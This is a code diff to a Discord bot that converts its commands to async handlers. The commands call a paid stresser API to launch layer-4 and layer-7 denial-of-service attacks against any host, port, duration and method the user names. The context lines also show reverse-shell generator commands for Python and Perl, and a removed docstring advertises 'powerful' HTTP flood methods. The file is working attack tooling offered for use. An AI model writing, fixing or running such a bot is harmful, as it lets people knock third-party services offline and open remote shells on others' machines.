@@ -221,7 +221,7 @@ async def genShellPy(ctx, ip=None, port=None):
     await ctx.send(pyBeginning + pyShell)
 
 @bot.command()
-def stresse_layer4(api_key, host, port, time, method):
+async def stresse_layer4(ctx, api_key, host, port, time, method):
     base_url = "https://stresse.ru/api/api.php"
     action = "layer4"
     url = f"{base_url}?key={api_key}&action={action}&host={host}&port={port}&time={time}&method={method}"
@@ -231,29 +231,17 @@ def stresse_layer4(api_key, host, port, time, method):
         if response.status_code == 200:
             data = response.json()
             if data.get("status"):
-                return f"Success: {data.get('body')}, Attack ID: {data.get('attack_id')}"
+                await ctx.send(f"Success: {data.get('body')}, Attack ID: {data.get('attack_id')}")
             else:
-                return f"API Error: {data.get('body')}"
+                await ctx.send(f"API Error: {data.get('body')}")
         else:
-            return f"Request to the API failed with status code: {response.status_code}"
+            await ctx.send(f"Request to the API failed with status code: {response.status_code}")
     except Exception as e:
-        return f"Failed to connect to the API: {str(e)}"
+        await ctx.send(f"Failed to connect to the API: {str(e)}")
 
 @bot.command()
-async def launch_layer7_attack(api_key, host, port, time, method, postdata=None, cookie=None, referer=None, useragent=None, req=None, delay=None, con=None):
-    """
-    AUTOMATION 	HTTP 	Effective method for HTTP/HTTPs
-    BYPASS 	HTTP 	Effective method for HTTP/HTTPs
-    SOCKET 	HTTP 	Socket method for mass requests
-    SPAMMER 	HTTP 	Spammer method for mass requests
-    BYPASS 	HTTP 	Powerful layer 7 attack.
-    SOCKET 	HTTP 	Powerful layer 7 attack.
-    AUTOMATION 	HTTP 	Powerful layer 7 attack.
-    SPAMMER 	HTTP 	Powerful layer 7 attack.
-    ELITE 	HTTP 	Powerful layer 7 attack.
-    """
-
-    api_key = ''
+async def launch_layer7_attack(ctx, host, port, time, method, postdata=None, cookie=None, referer=None, useragent=None, req=None, delay=None, con=None):
+    api_key = 'YOUR_API_KEY'  # Replace with your actual API key
 
     api_url = "https://stresse.ru/api/api.php"
     params = {
@@ -277,12 +265,11 @@ async def launch_layer7_attack(api_key, host, port, time, method, postdata=None,
     if response.status_code == 200:
         response_json = response.json()
         if response_json.get("status"):
-            return f"Success: {response_json['body']}, Attack ID: {response_json['attack_id']}"
+            await ctx.send(f"Success: {response_json['body']}, Attack ID: {response_json['attack_id']}")
         else:
-            return f"API Error: {response_json.get('error', 'Unknown error')}"
+            await ctx.send(f"API Error: {response_json.get('error', 'Unknown error')}")
     else:
-        return f"Your connection to API failed (Error {response.status_code}), check your connection and try again"
-    
+        await ctx.send(f"Your connection to API failed (Error {response.status_code}), check your connection and try again")
 
 @bot.command()
 async def genShellPerl(ctx, ip=None, port=None):
